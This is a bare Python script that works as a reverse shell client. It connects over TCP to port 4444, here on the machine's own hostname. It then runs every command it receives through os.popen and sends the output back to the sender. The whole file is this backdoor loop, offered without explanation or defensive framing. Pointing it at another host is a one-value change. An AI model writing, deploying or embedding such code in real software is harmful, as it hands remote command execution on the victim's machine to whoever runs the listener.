import socket
import os
client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)

host = socket.gethostname()
port = 4444

print("Connection to", host, port)
client.connect((host,port))

while True:
	print("Connected to", host, port)
	message = client.recv(1024).decode()
	print("Recieved from", host, port)
	stream = os.popen(message)
	output = stream.read()
	client.send(output.encode())



